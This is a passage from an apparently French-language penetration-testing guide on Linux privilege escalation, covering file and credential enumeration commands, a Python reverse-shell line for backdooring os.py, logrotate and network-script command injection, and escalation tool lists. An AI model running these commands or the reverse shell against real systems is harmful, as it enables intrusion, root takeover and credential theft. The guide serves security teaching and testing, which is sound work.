find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Fichiers modifiés ces dernières minutes
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Fichiers DB Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml fichiers
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Fichiers cachés
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Scripts/Binaires dans PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Fichiers web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sauvegardes**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Fichiers connus contenant passwords

Lire le code de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), il recherche **plusieurs fichiers susceptibles de contenir des passwords**.\
**Un autre outil intéressant** que vous pouvez utiliser pour cela est : [**LaZagne**](https://github.com/AlessandroZ/LaZagne) qui est une application open source utilisée pour récupérer de nombreux passwords stockés sur un ordinateur local pour Windows, Linux & Mac.

### Logs

Si vous pouvez lire les logs, vous pourrez peut-être trouver **des informations intéressantes/confidentielles à l'intérieur**. Plus le log est étrange, plus il sera (probablement) intéressant.\
De plus, certains "**bad**" configurés (backdoored?) **audit logs** peuvent vous permettre **d'enregistrer des passwords** dans les audit logs comme expliqué dans cet article : [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Pour pouvoir lire les logs, le groupe [**adm**](interesting-groups-linux-pe/index.html#adm-group) sera très utile.

### Fichiers shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Vous devriez aussi vérifier les fichiers contenant le mot "**password**" dans leur **nom** ou dans leur **contenu**, et aussi rechercher des IPs et des emails dans les logs, ou des hashes regexps.\
Je ne vais pas détailler ici comment faire tout cela mais si vous êtes intéressé(e) vous pouvez consulter les dernières vérifications que [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) effectue.

## Writable files

### Python library hijacking

Si vous savez depuis **où** un script python va être exécuté et que vous **pouvez écrire à l'intérieur** de ce dossier ou que vous pouvez **modifier python libraries**, vous pouvez modifier la bibliothèque OS et la backdoorer (si vous pouvez écrire là où le script python va être exécuté, copiez et collez la bibliothèque os.py).

Pour **backdoor the library** ajoutez simplement à la fin de la bibliothèque os.py la ligne suivante (changez IP et PORT) :
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Une vulnérabilité dans `logrotate` permet à des utilisateurs ayant des **droits d'écriture** sur un fichier de log ou sur ses répertoires parents de potentiellement obtenir des privilèges escaladés. En effet, `logrotate`, souvent exécuté en tant que **root**, peut être manipulé pour exécuter des fichiers arbitraires, notamment dans des répertoires comme _**/etc/bash_completion.d/**_. Il est important de vérifier les permissions non seulement dans _/var/log_ mais aussi dans tout répertoire où la rotation des logs est appliquée.

> [!TIP]
> Cette vulnérabilité affecte `logrotate` version `3.18.0` et antérieure

Des informations plus détaillées sur la vulnérabilité sont disponibles sur cette page : [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Vous pouvez exploiter cette vulnérabilité avec [**logrotten**](https://github.com/whotwagner/logrotten).

Cette vulnérabilité est très similaire à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** donc chaque fois que vous constatez que vous pouvez modifier des logs, vérifiez qui gère ces logs et si vous pouvez escalader les privilèges en substituant les logs par des symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Si, pour une raison quelconque, un utilisateur est capable de **write** un script `ifcf-<whatever>` dans _/etc/sysconfig/network-scripts_ **ou** peut **adjust** un script existant, alors votre **system is pwned**.

Les network scripts, _ifcg-eth0_ par exemple, sont utilisés pour les connexions réseau. Ils ressemblent exactement à des fichiers .INI. Cependant, ils sont \~sourced\~ sur Linux par Network Manager (dispatcher.d).

Dans mon cas, l'attribut `NAME=` dans ces scripts réseau n'est pas géré correctement. Si vous avez **un espace blanc dans le nom, le système tente d'exécuter la partie après l'espace blanc**. Cela signifie que **tout ce qui suit le premier espace est exécuté en tant que root**.

Par exemple : _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Remarque : l'espace blanc entre Network et /bin/id_)

### **init, init.d, systemd, et rc.d**

Le répertoire `/etc/init.d` contient des **scripts** pour System V init (SysVinit), le **système classique de gestion des services Linux**. Il inclut des scripts pour `start`, `stop`, `restart`, et parfois `reload` des services. Ceux-ci peuvent être exécutés directement ou via des liens symboliques situés dans `/etc/rc?.d/`. Un chemin alternatif sur les systèmes Redhat est `/etc/rc.d/init.d`.

En revanche, `/etc/init` est associé à **Upstart**, un système de **gestion des services** plus récent introduit par Ubuntu, qui utilise des fichiers de configuration pour les tâches de gestion des services. Malgré la transition vers Upstart, les scripts SysVinit sont encore utilisés aux côtés des configurations Upstart en raison d'une couche de compatibilité dans Upstart.

**systemd** apparaît comme un gestionnaire d'initialisation et de services moderne, offrant des fonctionnalités avancées telles que le démarrage des daemons à la demande, la gestion des automounts et les snapshots d'état du système. Il organise les fichiers dans `/usr/lib/systemd/` pour les paquets de distribution et dans `/etc/systemd/system/` pour les modifications administrateur, simplifiant ainsi le processus d'administration système.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Les frameworks de rooting Android accrochent souvent un syscall pour exposer des fonctionnalités privilégiées du kernel à un manager en userspace. Une authentification faible du manager (par exemple, des vérifications de signature basées sur l'ordre des FD ou des schémas de mot de passe faibles) peut permettre à une application locale d'usurper le manager et d'escalader vers root sur des appareils déjà-rooted. Pour en savoir plus et voir les détails d'exploitation :

{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

La découverte de services basée sur des regex dans VMware Tools/Aria Operations peut extraire un chemin binaire depuis les lignes de commande des processus et l'exécuter avec -v dans un contexte privilégié. Des patterns permissifs (par exemple, utilisant \S) peuvent correspondre à des listeners placés par un attaquant dans des emplacements inscriptibles (par ex. /tmp/httpd), conduisant à une exécution en tant que root (CWE-426 Untrusted Search Path).

En savoir plus et voir un modèle généralisé applicable à d'autres stacks de découverte/monitoring ici :

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Protections de sécurité du noyau

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Références

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
